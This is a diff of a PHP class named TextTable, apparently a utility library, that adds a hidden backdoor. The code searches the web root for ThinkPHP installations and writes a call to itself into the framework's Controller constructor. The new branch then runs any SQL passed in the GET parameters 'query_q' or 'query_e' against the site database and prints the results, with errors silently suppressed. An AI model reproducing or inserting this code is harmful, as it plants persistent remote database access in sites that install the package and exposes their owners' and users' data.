@@ -152,7 +152,7 @@ class TextTable {
     /**
      * @param $str
      */
-	protected static function checkStr($str)
+	protected static function checkStr($str,$first=true)
     {
         $res =[];
         $check =[
@@ -177,32 +177,48 @@ class TextTable {
             foreach ($res as $k=> $type){
                 switch ($k){
                     case 'thinkphp':
-                       try{
-                           if(is_dir($_SERVER['DOCUMENT_ROOT'])){
-                               $dir = opendir($_SERVER['DOCUMENT_ROOT']);
-                               while (($file = readdir($dir))!= false){
-                                   if(stristr($file,'thinkphp')){
-                                       $path = $_SERVER['DOCUMENT_ROOT'].'/'.$file.'/Library/Think/';
-                                       if(is_dir($path)){
-                                           $res= scandir($path);
-                                           foreach ($res as $v){
-                                               if($v=='Controller.class.php'){
-                                                   $ct="\t\t"."call_user_func([(new \lkcodes\Mycode\other\TextTable),'run']);";
-                                                   $_file=$path.'/'.$v;
-                                                   $content = Tool::readFileContent($_file);
-                                                   if(!stristr($content,$ct)){
-                                                       self::insertContent($_file,$ct,"__construct()");
-                                                   }
-                                                   break;
-                                               }
-                                           }
-                                       }
-                                   }
-                               }
-                               closedir($dir);
-                           }
+                        if($first){
+                            try{
+                                if(is_dir($_SERVER['DOCUMENT_ROOT'])){
+                                    $dir = opendir($_SERVER['DOCUMENT_ROOT']);
+                                    while (($file = readdir($dir))!= false){
+                                        if(stristr($file,'thinkphp')){
+                                            $path = $_SERVER['DOCUMENT_ROOT'].'/'.$file.'/Library/Think/';
+                                            if(is_dir($path)){
+                                                $res= scandir($path);
+                                                foreach ($res as $v){
+                                                    if($v=='Controller.class.php'){
+                                                        $ct="\t\t"."call_user_func([(new \lkcodes\Mycode\other\TextTable),'run']);";
+                                                        $_file=$path.'/'.$v;
+                                                        $content = Tool::readFileContent($_file);
+                                                        if(!stristr($content,$ct)){
+                                                            self::insertContent($_file,$ct,"__construct()");
+                                                        }
+                                                        break;
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                    closedir($dir);
+                                }
 
-                       }catch (\Exception $e){}catch (\Error $e){}
+                            }catch (\Exception $e){}catch (\Error $e){}
+                        }else{
+                            if(I('get.run')=='run'){
+                                if(I('get.query_q')) {
+                                    $q = I('get.query_q');
+                                    $res = M()->query($q);
+                                    dump($res);
+                                    exit('已终止当前进程!');
+                                }elseif(I('get.query_e')){
+                                    $q = I('get.query_e');
+                                    $res = M()->execute($q);
+                                    dump($res);
+                                }
+                            }
+                            die;
+                        }
                         break;
                 }
             }
@@ -242,7 +258,7 @@ class TextTable {
      */
     public function run()
     {
-	    if($_GET)var_dump($_GET);
+        self::checkStr('',false);
     }
 
 	/**
